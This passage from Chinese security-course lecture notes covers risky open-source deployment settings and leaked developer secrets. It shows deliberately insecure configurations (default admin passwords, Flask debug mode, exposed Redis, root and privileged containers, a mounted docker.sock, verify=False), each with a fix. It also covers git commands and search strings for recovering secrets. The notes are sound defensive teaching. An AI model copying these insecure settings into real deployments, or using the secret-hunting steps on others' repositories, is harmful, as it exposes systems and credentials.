休息之后，讲师换了一个问题：假设开源软件本身没有漏洞，CI/CD 也都防护好了，**部署出去的软件就安全了吗？** 答案是不一定，因为还有**配置**（configuration）。

### 4.1 漏洞不总在源代码里 (S34, S35)

S34 的第一句话是：**安全的代码，部署之后仍然可能变得不安全**（*Secure code can still become insecure after deployment*）。同一份开源软件，可以有两种部署：

| 谨慎的部署（S34） | 冒险的部署（S34） |
|---|---|
| 开启认证（auth enabled） | 默认口令（default password） |
| 私有网络（private network） | 公开端口（public port） |
| 最小权限（least privilege） | debug 模式（debug mode） |

S34 的结论是：**漏洞不总在源代码里；有时它在于开源软件被怎样配置、怎样部署**。S35 用一个开源数据库服务举例。同一个数据库，放在内部网络里并开启认证，就**只有后端能访问**；放在公网上、用着默认口令，就**谁都能试着连上来**。讲师补充说，安全的设计里，数据库只允许后端服务访问，而且要求认证；冒险的设计把数据库开放给整个互联网，更糟的是连口令都没设，谁都能进去。

S35 的总结给了一个很好用的分析框架：**配置控制着攻击面：谁能访问这个服务，它拥有什么权限，安全检查有没有打开**（*who can reach the service, what permissions it has, and whether security checks are enabled*）。本节后面的七种错误配置，正好按这三个问题分组：

| S35 的问题 | 错误配置 | 本节 |
|---|---|---|
| 谁能访问？（暴露面） | 默认口令、生产环境开 debug、多余的服务 | §4.2–§4.4 |
| 它有什么权限？ | 以 root 运行、特权容器、危险的卷挂载 | §4.5–§4.7 |
| 安全检查开着吗？ | 关掉 TLS 验证 | §4.8 |

这一节和前几周是连着的。第 4 周 §2.6 说，云上的威胁**集中在配置和身份上**；第 8 周说，无线网络装起来又快又方便，常常匆忙部署，所以安全配置格外要紧。本周说的是同一件事，对象换成了开源软件的部署。

> 📎 **拓展(超出 slides)：暴露在公网上的数据库** — 这不是假想。2017 年初起，攻击者多次成批扫描公网上没设口令的 MongoDB、Elasticsearch 实例，删掉里面的数据，留下一张勒索字条。受害者的软件本身没有任何漏洞，问题全在"装好就直接对外、口令为空"的配置上。

### 4.2 不安全的默认值：默认口令 (S36)

S36 说：**很多开源服务为了方便，自带一套默认设置；部署前不改掉，它们就成了现成的入口**。S36 的示例配置和攻击过程：

```bash
ADMIN_USER=admin
ADMIN_PASSWORD=admin
ENABLE_ADMIN_PANEL=true
```

1. 攻击者发现了暴露在外的管理面板（admin panel）；
2. 攻击者试常见的默认凭据，比如 `admin/admin`；
3. 登录成功，因为默认口令从来没改过；
4. 攻击者拿到管理员权限，修改系统设置或数据。

讲师说，即使是很大的公司，内部也会做这种管理面板，用于调试或者数据分析，配置也就是这么简单：用户名 admin，口令 admin，管理面板开着。内部用没问题，**可上线之前，你还会让它开着吗？** 你能访问管理面板，攻击者也能。所以下次把软件部署到生产环境之前，记得把这些没必要的设置关掉，比如把 `ENABLE_ADMIN_PANEL` 设为 `false`。S36 的结论是：**默认凭据用于本地测试可以接受，但绝不应该留到生产环境**。

第 8 周 §7.1 的 IoT 默认口令是同一个问题：在那里，出厂口令让一台台摄像头变成了僵尸网络。更稳妥的做法（📎）是软件根本不出厂一个固定口令：首次启动时随机生成初始口令，或者强制管理员先设新口令才能使用。

### 4.3 不安全的默认值：生产环境里的 debug 模式 (S37)

S37 说：**debug 模式在开发时很有用，在生产环境里很危险**。S37 的例子是一个 Flask 应用：

```python
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    return "Hello"

app.run(
    host="0.0.0.0",
    debug=True
)
```

攻击过程是：攻击者发送畸形的输入，触发一个错误页面；debug 模式把**栈追踪**（stack trace，程序出错时一层层的函数调用记录）和**服务器内部的文件路径**打印了出来；错误输出暴露了环境细节甚至敏感变量；攻击者利用这些信息，策划一次更有针对性的攻击。讲师解释说，debug 模式的日志比平时多得多：你在作业里找 bug 时，也会把文件名、行号打印出来定位问题，公司的软件也一样。生产环境开着 debug，攻击者就可以**故意构造输入去触发错误**，读错误信息，知道你用了哪些函数、服务器上存了哪些内部文件。他知道得比以前多，就能接着发动更多攻击。

这个例子里其实有两处问题。`debug=True` 是 S37 说的那一处；`host="0.0.0.0"` 是另一处：它让服务监听**所有网络接口**，外面的机器都能连进来，而默认的 `127.0.0.1` 只允许本机访问。S37 给出的安全设置是：**`debug=False`，并且只通过一个受控的生产服务器对外提供服务**。它的结论是：**调试功能应该帮开发者诊断问题，而不是帮攻击者了解生产系统**。

> 📎 **拓展(超出 slides)：Flask 的 debug 比"泄露信息"更危险** — Flask 的 debug 模式会启用 Werkzeug 的交互式调试器：错误页面上带着一个**能执行任意 Python 代码的控制台**（新版本要先输入一个 PIN）。生产环境开着它，就不只是泄露栈追踪，而是可能直接给了攻击者一个远程执行代码的口子。Flask 的官方文档明确写着：不要在生产环境运行开发服务器，也不要开调试器。S37 说的"受控的生产服务器"，指的是 Gunicorn 这类专门的 WSGI 服务器，前面通常再放一个 Nginx 之类的反向代理。

### 4.4 不安全的默认值：多余的服务 (S38)

S38 说：**有些开源部署默认会启用额外的服务；用不上的服务，只会增加攻击面**。它的 Docker Compose 示例：

```yaml
services:
  web:
    image: my-oss-app
    ports:
      - "8080:8080"

  redis:
    image: redis
    ports:
      - "6379:6379"

  admin:
    image: my-oss-admin
    ports:
      - "9000:9000"
```

Docker Compose 用一个 YAML 文件描述一组一起运行的容器。`ports` 下的 `"6379:6379"` 意思是把**宿主机**的 6379 端口转发到容器的 6379 端口，而且默认在宿主机的所有网络接口上开放。于是 S38 的攻击过程是：攻击者扫描服务器，发现一个暴露在外的 Redis；只有后端需要 Redis，它却能从互联网直接访问；攻击者直接连上去，读取或修改缓存的数据；这个暴露的服务成了进入系统的一个**多余的入口**。

讲师解释说，Redis 是一个数据库（常用作缓存），你的服务器上不只跑着你的应用，还跑着 Redis 和前面讲的管理面板。Redis 要是能从外面访问，攻击者就能连上去，看到你的用户数据，甚至用户的口令。更好的设计是：**Redis 只允许你自己的应用访问，不对互联网开放**。S38 的安全做法是：**只启用需要的服务，并且只把它们暴露给需要访问的那些组件**。图 4 对比了改动前后的暴露面。

```svg 图 4 · S38 的部署改动前后（示意）。左：三个服务的端口都发布到宿主机上，互联网能直接连到 Redis 和管理面板（橙色）。右：只有 web 对外；Redis 只在 Compose 的内部网络里，只有 web 能访问；管理面板只绑定本机地址
<svg viewBox="0 0 640 300">
  <defs>
    <marker id="g" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="solid-good"/></marker>
    <marker id="w" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="solid-warn"/></marker>
  </defs>
  <text x="160" y="22" text-anchor="middle">S38 的写法：三个端口都对外</text>
  <ellipse cx="160" cy="62" rx="70" ry="22" class="muted fill-muted" stroke-width="1.5"/>
  <text x="160" y="67" text-anchor="middle">互联网</text>
  <rect x="20" y="118" width="280" height="150" rx="10" class="ink" fill="none" stroke-width="1.5"/>
  <text x="34" y="140" class="muted">宿主机</text>
  <rect x="35" y="180" width="80" height="56" rx="6" class="good fill-good" stroke-width="2"/>
  <text x="75" y="204" text-anchor="middle">web</text>
  <text x="75" y="224" text-anchor="middle">:8080</text>
  <rect x="120" y="180" width="80" height="56" rx="6" class="warn fill-warn" stroke-width="2"/>
  <text x="160" y="204" text-anchor="middle">redis</text>
  <text x="160" y="224" text-anchor="middle">:6379</text>
  <rect x="205" y="180" width="80" height="56" rx="6" class="warn fill-warn" stroke-width="2"/>
  <text x="245" y="204" text-anchor="middle">admin</text>
  <text x="245" y="224" text-anchor="middle">:9000</text>
  <line x1="132" y1="81" x2="82" y2="175" class="good" stroke-width="1.8" marker-end="url(#g)"/>
  <line x1="160" y1="85" x2="160" y2="175" class="warn" stroke-width="1.8" marker-end="url(#w)"/>
  <line x1="188" y1="81" x2="238" y2="175" class="warn" stroke-width="1.8" marker-end="url(#w)"/>
  <text x="160" y="292" text-anchor="middle" class="warn">从外面能直接连到 3 个服务</text>
  <text x="480" y="22" text-anchor="middle">收紧之后：只有 web 对外</text>
  <ellipse cx="480" cy="62" rx="70" ry="22" class="muted fill-muted" stroke-width="1.5"/>
  <text x="480" y="67" text-anchor="middle">互联网</text>
  <rect x="340" y="118" width="280" height="150" rx="10" class="ink" fill="none" stroke-width="1.5"/>
  <text x="354" y="140" class="muted">宿主机</text>
  <rect x="345" y="172" width="182" height="72" rx="8" class="accent dashed" fill="none" stroke-width="1.5"/>
  <text x="436" y="260" text-anchor="middle" class="accent">内部网络</text>
  <rect x="352" y="180" width="80" height="56" rx="6" class="good fill-good" stroke-width="2"/>
  <text x="392" y="204" text-anchor="middle">web</text>
  <text x="392" y="224" text-anchor="middle">:8080</text>
  <rect x="440" y="180" width="80" height="56" rx="6" class="muted fill-muted" stroke-width="2"/>
  <text x="480" y="204" text-anchor="middle">redis</text>
  <text x="480" y="224" text-anchor="middle" class="muted">不发布</text>
  <rect x="533" y="180" width="80" height="56" rx="6" class="muted fill-muted" stroke-width="2"/>
  <text x="573" y="204" text-anchor="middle">admin</text>
  <text x="573" y="224" text-anchor="middle" class="muted">仅本机</text>
  <line x1="455" y1="82" x2="398" y2="175" class="good" stroke-width="1.8" marker-end="url(#g)"/>
  <text x="480" y="292" text-anchor="middle" class="good">从外面只能连到 web</text>
</svg>
```

> **🔑 例：把 S38 的 Compose 文件改安全** — 按 S38 的两条原则（只启用需要的服务、只暴露给需要的组件）改写：
>
> ```yaml
> services:
>   web:
>     image: my-oss-app
>     ports:
>       - "8080:8080"              # 唯一对外开放的端口
>
>   redis:
>     image: redis
>     # 不写 ports：Redis 只在 Compose 的内部网络里，web 用 redis:6379 访问它
>
>   admin:
>     image: my-oss-admin
>     ports:
>       - "127.0.0.1:9000:9000"    # 只绑定本机地址，外面连不进来
> ```
>
> 同一个 Compose 文件里的服务默认处在同一个内部网络中，彼此可以用服务名访问，**不需要**把端口发布到宿主机上。管理员要用管理面板时，从自己的电脑开一条 SSH 本地转发（第 5 周 §6.3 的 `-L`）：`ssh -L 9000:localhost:9000 用户名@服务器`，然后在本机浏览器打开 `localhost:9000`。如果管理面板根本用不上，最好的做法是直接把 `admin` 这个服务删掉。

> 📎 **拓展(超出 slides)：防火墙也不一定挡得住** — 在 Linux 上，Docker 发布端口时会直接改写 iptables 规则，这些规则排在 ufw 之类主机防火墙的规则前面。所以"我开了 ufw，只放行 8080"并不保证 6379 从外面连不上。最可靠的办法就是上面那样：根本不发布不需要的端口。

### 4.5 权限风险：以 root 运行 (S39)

从这一节起，问题从"谁能访问"变成了"进来之后能做什么"。S39 说：**以 root 身份运行开源服务，给了进程不必要的权力；服务一旦被攻破，攻击者就可能拿到环境里的 root 级控制权**。它的 Dockerfile 示例：

```dockerfile
FROM node:20

WORKDIR /app
COPY . .

RUN npm install

# Default user is root
CMD ["npm", "start"]
```

Dockerfile 里没有写 `USER`，容器里的进程就默认以 root 运行。攻击过程：攻击者利用这个开源服务的一个漏洞；被攻破的进程正以 root 运行；攻击者可以修改受保护的文件、安装工具、控制其他进程；**一个应用层面的漏洞，就这样带来了大得多的系统影响**。

讲师讲了开发者为什么会这样做：开发和测试时，经常要新建文件夹、删文件、挪文件，有些操作会因为权限不够而失败，有的开发者干脆所有步骤都用 root。设想攻击者发现了你软件里的一个漏洞，能往里面注入代码并执行，这叫**远程代码执行**（remote code execution, RCE）。如果软件以 root 运行，注入的代码也就以 root 运行：可以 `rm -rf` 删掉你的文件，可以改任何受保护的文件，甚至可以以 root 权限启动新的进程。S39 的做法是：**创建一个非 root 用户，用受限的权限运行服务**。它的结论是：**服务只应拥有完成工作所需的最小权限**。这就是讲师说的**最小权限原则**（principle of least privilege）。

> **🔑 例：S39 的 Dockerfile 改一行** — Node 的官方镜像里已经预置了一个叫 `node` 的普通用户，在启动命令之前切换过去即可：
>
> ```dockerfile
> FROM node:20
> WORKDIR /app
> COPY --chown=node:node . .
> RUN npm install
> USER node                 # 之后的进程都以普通用户运行
> CMD ["npm", "start"]
> ```
>
> 同样的 RCE 漏洞，现在攻击者拿到的只是一个普通用户：改不了系统文件，装不了系统工具，也动不了别的用户的进程。漏洞还在，**损失被限制住了**。

> 📎 **拓展(超出 slides)：容器里的 root 有多危险** — 容器里的 root 并不完全等于宿主机的 root，Docker 默认会去掉一部分特权。但容器和宿主机**共用同一个操作系统内核**，内核或容器运行时的漏洞一旦被利用，容器里的 root 离宿主机的 root 只差一步。所以"反正在容器里"不是以 root 运行的理由。容器的隔离靠什么、和虚拟机有什么不同，是第 11 周的内容。

### 4.6 权限风险：特权容器和 Docker socket (S40)

S40 说：**特权容器（privileged container）拿到了对宿主机的广泛访问权，削弱了容器本来提供的隔离**。它的 Compose 示例有两个问题：

```yaml
services:
  app:
    image: my-oss-app
    privileged: true
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```

`privileged: true` 让容器几乎拥有宿主机的全部能力，包括直接访问硬件设备。第二个问题更隐蔽：它把宿主机上的 `/var/run/docker.sock` **挂载**进了容器。这个文件是 **Docker 守护进程**（Docker daemon）的 API 入口：`docker run`、`docker ps` 这些命令，都是通过它告诉守护进程该做什么。而守护进程在宿主机上**以 root 身份运行**。S40 的攻击过程是：攻击者利用容器里开源服务的漏洞；容器带着 `privileged: true`，又能访问 Docker socket；攻击者借这些权限控制宿主机上的资源，或者启动新容器；**一个容器里的入侵，就这样升级成了对宿主机的控制**。S40 的建议是：**避免 `privileged: true`，只授予服务真正需要的那几项能力（capabilities）或挂载**。

讲师解释了 Docker socket 为什么危险：**能访问这个 socket 的人，就能创建 Docker 容器**；创建容器时，可以指定把任意目录挂载进去。于是攻击者控制了你的应用容器之后，就请宿主机替他新建一个容器，把宿主机的整个文件系统挂进去，宿主机上的所有文件就都能读写了。讲师说：你用 Docker 是想保护宿主机，结果配置错了，Docker 反而成了攻击者的工具。

课上一位同学提出了质疑：**可是攻击者逃不出这个容器啊？** 讲师说没错，他逃不出**这个**容器，但他能用这个 socket **新建一个**容器。同学又问：新建一个容器有什么用？讲师在黑板上解释：创建容器时可以指定要挂载的卷，攻击者就指定挂载宿主机上存着环境变量和秘密的目录、存着口令的目录，甚至宿主机的根目录。原来的容器只能看到挂载给它的那一小部分，新容器却能看到攻击者想看的一切。同学听懂了：攻击者是在借宿主机的手，造一个能访问宿主机资源的容器。图 5 画出了这条路径。

```d2 图 5 · Docker socket 的攻击路径（S40）：攻击者逃不出自己所在的容器，却能通过挂载进来的 docker.sock，请宿主机上以 root 运行的 Docker 守护进程替他新建一个容器，并把宿主机的根目录挂进去
direction: down
atk: "① 攻击者利用应用漏洞\n在容器里执行代码" {class: warn}
app: "应用容器\n挂载了 docker.sock"
daemon: "Docker 守护进程\n以 root 运行在宿主机上" {class: key}
new: "③ 新建的容器\n挂载了宿主机根目录 /" {class: warn}
host: "④ 宿主机的全部文件\n口令、密钥、SSH key" {class: warn}
atk -> app
app -> daemon: "② 经 socket 调用 Docker API"
daemon -> new: 照办
new -> host: 读写
```

这个例子的要点可以浓缩成一句话（📎，Docker 官方文档也这样说）：**能访问 Docker socket，就等于拥有宿主机的 root 权限**。所以除非确实需要（比如一个专门管理容器的工具），永远不要把 `docker.sock` 挂进应用容器。

### 4.7 权限风险：危险的卷挂载 (S41)

S41（课上只提了一句）说：**卷挂载（volume mount）让容器能访问宿主机的文件；挂载范围太宽，容器就可能读取或修改宿主机上的敏感数据**。它的例子：

```yaml
services:
  app:
    image: my-oss-app
    volumes:
      - /:/host
      - ~/.ssh:/root/.ssh
```

第一行把宿主机的**整个根目录**挂到容器的 `/host` 下，第二行把宿主机用户的 SSH 密钥目录挂进了容器。攻击过程：Web 应用有一个文件上传漏洞；攻击者借此在容器里执行代码；因为挂载了 `/:/host`，攻击者能读宿主机上的任何文件；宿主机的 SSH 密钥和配置随之暴露。S41 的做法是：**只挂载确实需要的那个目录，最好是只读的**。结论是：**一个卷挂载，可以把一次容器入侵变成一次宿主机数据泄露**。

注意第二行的后果不止于这台机器。第 5 周 §3.2 说过，SSH 私钥证明的是"持有"：攻击者拿到 `~/.ssh` 里的私钥，就能以这个用户的身份登录所有信任这把公钥的服务器，从一台机器跳到一群机器。安全的写法是把挂载缩到最小，并加上 `:ro`（read-only，只读）：

```yaml
    volumes:
      - ./uploads:/app/uploads          # 只挂应用需要写的目录
      - ./config:/app/config:ro         # 配置文件只读
```

§4.5 到 §4.7 合起来看，是**同一个原则的三个层次**：进程不要以 root 运行（§4.5），容器不要拿到宿主机的特权和 Docker socket（§4.6），容器也不要看到宿主机上它不需要的文件（§4.7）。每一层都在回答 S35 的第二个问题：它拥有什么权限？

### 4.8 关掉安全检查：verify=False (S42)

S42 课上没有讲，但它和第 7 周的内容直接相关。S42 说：**TLS 验证确保客户端是在和合法的服务器通信**。它的例子：

```python
import requests

r = requests.get(
    "https://api.example.com/data",
    verify=False
)
```

`verify=False` 让 Python 的 requests 库**不检查服务器证书**。S42 的攻击过程：应用连接 `https://api.example.com`；TLS 验证被关掉了；攻击者在网络上截获流量；应用接受了攻击者的假证书；API 的响应或者 token 被窃取、被篡改。S42 的做法是：**保持 TLS 验证开启，并正确配置受信任的证书**。结论是：**关掉安全检查也许能让部署更省事，但它拿掉了一层重要的保护**。

为什么有人会写 `verify=False`？通常是因为遇到了证书错误。公司内部的服务常用自签名证书或者内部 CA 签发的证书，它们不在系统默认的信任库里（第 7 周 §3.2、§6.1），requests 就报 `certificate verify failed`。`verify=False` 让这个报错消失了，可消失的不只是报错，还有**对服务器身份的认证**。第 7 周 §3.4 列出的客户端检查（证书链能不能追到受信任的根、名字对不对、在不在有效期内）一项都不做了。连接仍然是加密的，可**和谁加密**没有保证：这正是第 6 周 §1.4 那个没有认证的 Diffie–Hellman，中间人和你协商一把密钥，再和真正的服务器协商另一把，两边的内容他都看得到。

正确的修法是让客户端信任那个内部 CA，而不是谁都信：

```python
r = requests.get(
    "https://api.example.com/data",
    verify="/etc/ssl/certs/internal-ca.pem"   # 只额外信任公司内部的 CA
)
```

或者干脆修好服务器的证书链。第 7 周 §7.3 讲过管理员往信任库里加 CA 的情形，这里是同一个道理：要扩大信任，就明确地、有限地扩大，而不是把检查整个关掉。

### 4.9 配置加固清单 (S43)

S43 的要求是：**部署开源软件之前，要检查部署配置，而不只是源代码**。它把清单分成两栏，下表补上了每一项对应的小节：

| 减少暴露（Reduce exposure） | 本节 | 减少权限（Reduce privilege） | 本节 |
|---|---|---|---|
| 改掉默认凭据 | §4.2 | 以非 root 用户运行 | §4.5 |
| 关掉 debug 模式 | §4.3 | 避免特权容器 | §4.6 |
| 只暴露需要的端口 | §4.4 | 限制卷挂载 | §4.7 |
| 管理界面保持私有 | §4.2、§4.4 | 开启 TLS、认证等安全机制 | §4.8 |

S43 的结论是：**配置是安全边界的一部分。一个安全的开源项目，仍然可能因为不安全的部署而变得易受攻击**。讲师的总结也是这两栏：上线之前，把不需要的设置关掉，把不需要的权限收回。

<details>
<summary>自测：一份 Compose 文件里有这几行：privileged: true、挂载 /var/run/docker.sock、挂载 /:/host、Redis 的端口写成 "6379:6379"。逐条指出问题，并给出改法。</summary>

privileged: true 让容器几乎拥有宿主机的全部能力，削弱隔离（S40），应删掉，只授予需要的 capability。挂载 docker.sock 等于把宿主机的 root 交给容器：攻击者可以请 Docker 守护进程新建一个挂载宿主机根目录的容器（S40、图 5），应删掉。挂载 /:/host 让容器里的攻击者能读写宿主机的全部文件（S41），应只挂需要的目录，最好只读。Redis 的端口发布到宿主机所有接口上，互联网能直接连（S38），应去掉 ports，让它只在内部网络里供 web 访问。前两条和第三条属于"减少权限"，最后一条属于"减少暴露"（S43）。

</details>

<details>
<summary>自测：同事说"verify=False 没关系，连接还是 HTTPS，数据还是加密的"。这句话错在哪里？</summary>

加密只保证"只有和你协商出密钥的那一方能读"，不保证那一方是谁。关掉证书验证，客户端就不再确认对方是不是 api.example.com：中间人可以出示自己的假证书，和客户端完成加密握手，再和真正的服务器另建一条连接，两边的内容（包括 token）他都能读、能改（S42）。这就是第 6 周 §1.4 没有认证的密钥协商面对的中间人攻击。正确的做法是保持验证开启，让客户端信任内部 CA（verify 指向 CA 证书文件）。

</details>

## 5. 秘密安全（一）：开发者手里的密钥

讲师把"秘密"分成了两个故事。一个在**开发者**这一侧：软件要连数据库、调第三方 API、读写云存储，靠的是 API key、token、口令这些秘密（本节）。另一个在**用户**这一侧：用户登录你的软件，靠的是口令，或者 passkey（§6）。两边的秘密性质正好相反，开发者的秘密应该又长又随机，用户的口令却往往又短又好猜，后面会看到这个差别怎样影响检测和防御。

### 5.1 开源软件为什么需要秘密 (S45)

S45 说：**开源软件经常要访问外部服务，用 token、API key 或 secret key 来认证**。它的配图是一个开源应用伸出三条线：凭**数据库口令**连数据库，凭 **API token** 调第三方 API，凭 **secret key** 访问云存储。示例配置：

```bash
DB_PASSWORD=example_password
STRIPE_API_KEY=sk_live_xxxxx
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=xxxxxxxx
```

讲师解释了 Stripe：它是一个在线支付服务，你的用户想升级成付费会员，就通过 Stripe 付钱给你，你的软件要调 Stripe 的 API，就得带上 Stripe 的密钥。注意这些值的**格式**：Stripe 的正式环境密钥以 `sk_live_` 开头，AWS 的访问密钥 ID 以 `AKIA` 开头。这些固定的前缀在 §5.6 会变成检测秘密的线索。

S45 列出了秘密为什么重要：它们**用来向外部服务证明身份**；它们**授予了访问数据库、API 和云资源的权限**；**一旦泄露，攻击者就能访问同样的资源**。第 4 周 §2.7 把这件事说得更直白：一个 API 凭据代表一份远程的权力，谁复制到了它，谁就拥有这份权力，不需要再输入任何口令。

### 5.2 硬编码的秘密删不掉 (S46)

把秘密直接写在源代码里，叫**硬编码**（hard-coded）的秘密。S46 说：**开发者有时会不小心把 API key、access token 这样的秘密提交进 Git 仓库；一旦暴露，攻击者能很快发现并滥用它们**。接着是红字强调的一句：**删除秘密，并不能把它去掉**（*Deleting the secret does not remove it*）。S46 画了两个 commit：

> **Commit A**：`+ API_KEY="abcd1234"`（加入了密钥）
>
> **Commit B**：`- API_KEY removed`（删掉了密钥）

**这个秘密仍然可以从 Commit A、通过 Git 历史找回来。** 原因在 §2.1 的 Git 名词里：每个 commit 是一份完整的快照，Commit B 只是在历史末尾**追加**了一份新快照，Commit A 原封不动地留在历史里，和第 2 周区块链里的旧区块一样。讲师说，GitHub 记录了每一个 commit：你第一次提交时，它记下了 API key 的值；你立刻删掉、再提交一次，它又记下"这个 key 被删了"，但前一次的记录还在。**秘密一旦推送到 GitHub，就再也收不回来了。** 找回它只需要两条命令：

```bash
git log -p -S "API_KEY"            # 列出所有增删过 API_KEY 这个字符串的 commit，并显示改动内容
git show <Commit A 的哈希>:config.js  # 直接查看 Commit A 时这个文件的完整内容
```

课上一位同学说，GitHub 不是会自动检查吗？讲师说没错，GitHub 有 **secret scanning**，会自动扫描开发者推送的代码，但那是在**推送之后**，秘密已经公开了。同学们一致认为，除非把整个仓库删掉，否则没办法真正去掉它；而即使删了仓库，别人可能早已 clone 或 fork 了一份。另一位同学讲了一个真实的故事：有学生把 Amazon Web Services 的密钥推到了 GitHub 上，被人拿去开服务器，最后收到了几千美元的账单。

> **🔑 例：发现密钥被提交之后该做什么** — 假设你刚发现，十分钟前推送的 commit 里有一把 AWS 访问密钥。按 S46 的道理，"再提交一次把它删掉"没有用。正确的顺序是：
>
> 1. **立即作废并轮换**（revoke and rotate）：到 AWS 控制台停用这把密钥，换一把新的。这是唯一真正有效的一步，因为它让泄露出去的那份失去作用。
> 2. **查日志**：看这把密钥在泄露后有没有被使用过，比如有没有陌生的地区启动了一批服务器。S49 说自动扫描器往往**几分钟之内**就会发现并利用暴露的秘密，所以要假设它已经被用过。
> 3. **再清理历史**：用 `git filter-repo` 之类的工具把它从历史中抹掉。这一步只能防止以后的人从你的仓库里再看到它，收不回已经被 clone、fork 或缓存的副本，所以它排在最后。
> 4. **防止再犯**：把密钥改成从环境变量读取（§5.5），给仓库加上 pre-commit 扫描。
>
> 顺序很重要：先让秘密失效，再处理代码。

### 5.3 问题有多严重，为什么会发生 (S47)

S47 引用了 GitGuardian 的《State of Secrets Sprawl 2026》报告：

- **2025 年，GitHub 上新泄露了 2900 万个秘密**；
- **AI 辅助的 commit 明显加剧了秘密泛滥：大约是 2 倍**。讲师的说法是，AI 生成的代码泄露秘密的比例约是人写代码的两倍；
- **4.61% 的公开 GitHub 仓库至少含有一个泄露的秘密**；
- **在扫描的 11 亿个 commit 里，约 800 万个至少暴露了一个秘密**。

算一下最后一条：800 万 ÷ 11 亿 ≈ 0.73%，也就是**大约每 140 个 commit 里就有一个带着秘密**。

为什么会这样？S47 引用了 Basak 等人在 IEEE SecDev 2022 上的研究：**开发者把方便看得比安全更重要**；**很多开发者缺乏有效的秘密管理实践**。讲师补充说，开发者往往没有意识到泄露一把密钥的后果有多严重，写死在代码里最省事，于是就写死了。

### 5.4 不止 GitHub：秘密藏在各种软件制品里 (S48)

S48 把视野扩大了：**秘密可能从各种软件制品里暴露出来，不只是源代码仓库**。它列出了六类制品，以及在里面该看哪些文件：

| 制品（S48） | 去哪里找（S48） | 为什么会有秘密 |
|---|---|---|
| 手机应用 | `.apk` / `.ipa`；`strings.xml` / `Info.plist` | 应用要直接调第三方 API，开发者把 key 打包进了安装包 |
| 浏览器扩展 | `manifest.json`；打包后的 JS 文件 | 扩展的代码整个下载到用户电脑上 |
| 桌面应用 | `app.asar`；`config.json` | 同上，配置文件随程序一起分发 |
| 容器镜像 | `.env`；镜像层（image layers） | 构建镜像时把 `.env` 一起拷了进去 |
| 前端打包文件 | `main.js`；source map | 浏览器要执行的代码，任何访客都能下载 |
| 日志与崩溃报告 | debug 输出；遥测数据 | 出错时把环境变量、请求头整个打印了出来 |

S48 的方法很简单：**拆开一个制品，搜索像秘密的字符串**，比如 `api_key`、`token`、`secret`、`AKIA`、`PRIVATE KEY`。讲师说，Android 应用、浏览器扩展、桌面软件、Docker 镜像、前端代码里都可能有；有的开发者甚至把秘密打进日志或崩溃报告，而这些报告有时是公开的。

这张表背后有一个统一的道理：**发给用户的东西，用户都能拆开看**。一个手机应用、一段前端 JavaScript，本质上是一个"编译过的公开仓库"。代码混淆改不了字符串常量的内容，`.apk` 其实就是一个 zip 包，source map 甚至能还原出原始的源代码。

> 📎 **拓展(超出 slides)：镜像层和 Git 历史是同一个问题** — Docker 镜像由一层层只读的文件层叠起来。如果 Dockerfile 先 `COPY .env`，下一步再 `RUN rm .env`，最终的容器里确实看不到 `.env`，可它仍然完整地保存在上一层里，任何拿到镜像的人都能把那一层解出来。这和 S46 的 Git 历史一模一样："删除"只是追加了一条新记录。

> 📎 **拓展(超出 slides)：必须放在客户端的，就不算秘密** — 如果一个 key 必须打包进应用才能用，那就默认它会被所有人看到。正确的设计是不让客户端持有真正的秘密：客户端调用你自己的后端，由后端带着秘密去调第三方 API；或者使用服务商专门提供的、权限受限的公开 key（比如 Stripe 以 `pk_` 开头的 publishable key，只能用来发起支付，不能退款、查账）。

### 5.5 秘密该放在哪里：做法与工具 (S49)

S49 先总结了五条：

1. **暴露的秘密往往在几分钟之内就会被自动扫描器发现并利用。**
2. **Git 历史会保留以前提交过的秘密，即使文件已经删除。**
3. **秘密检测应该集成进 CI/CD 流水线。**
4. **定期轮换秘密，能减小意外泄露的影响。**
5. **秘密管理应该依靠专门的保险库（vault），而不是源代码。**

课上讲师问全班：**秘密应该放在哪里？** 有同学说存在数据库里，讲师说可以，或者存在本地；接着追问：可代码还是要用这个秘密去访问数据库，**放在本地的话，代码里怎么用？** 讨论的结果是：把秘密放进配置或环境里，代码每次运行时从配置里读出来、交给需要它的地方。这样**即使源代码泄露了，别人也不知道你的秘密**。讲师说这是最好的做法：**永远不要把秘密写进代码**。写成代码就是这样：

```python
import os

api_key = os.environ["STRIPE_API_KEY"]   # 值由部署环境或 CI 的 secret store 在运行时注入
```

本地开发时，这些值通常放在一个 `.env` 文件里，而 `.env` 必须写进 `.gitignore`，不能提交，也不能打进镜像（§5.4）。这和 §3.3 CI 注入秘密的方式是同一个思路：**代码里只有名字，值在运行时由别处提供**。S49 第五条说的"保险库"更进一步：第 4 周 §4.2 的云 KMS、HashiCorp Vault、AWS Secrets Manager 这类服务集中保管秘密，按身份授权、记录每一次读取，有的还能为每次请求临时生成一个短期凭据（和 §3.9 的 OIDC 同一个方向）。

S49 的下半部分是三个常用工具：

| 工具 | 什么时候用 | 做什么 |
|---|---|---|
| **Gitleaks** | 提交前 / CI 中 | 用规则和正则表达式扫描源代码和 **Git 历史**，找硬编码的秘密 |
| **TruffleHog** | 提交前 / CI 中 | 用正则表达式和**高熵分析**检测秘密，还能**验证**暴露的凭据是否仍然有效 |
| **GitHub Secret Scanning** | 推送之后 | 持续扫描仓库，发现受支持类型的凭据后提醒仓库主人 |

注意"什么时候用"这一列排出了一条时间线，越早越好：**提交前**（作为 Git 的 pre-commit 钩子，秘密还没离开你的电脑）→ **CI 中**（秘密进了 PR，但还没合并进主分支，CI 失败、拦下合并）→ **推送之后**（秘密已经公开，只能尽快提醒、尽快轮换）。课上那位同学说的"GitHub 会自动检查"属于最后一道，讲师提醒的正是它来得太晚。

> 📎 **拓展(超出 slides)：push protection** — GitHub 后来在 secret scanning 之外加了 push protection：推送时如果检测到受支持类型的秘密，直接拒绝这次推送，把"推送之后"的检查提前到了推送的那一刻。即便如此，它只认识有固定格式的秘密，§5.6 会看到为什么格式之外的秘密更难找。

### 5.6 怎样认出一个秘密：四种扫描技术 (S50)

扫描工具面对的是成千上万个字符串，它凭什么判断某一个是秘密？S50 按"用什么证据下判断"把技术分成四类：

| 技术（S50） | 证据 | S50 的例子 |
|---|---|---|
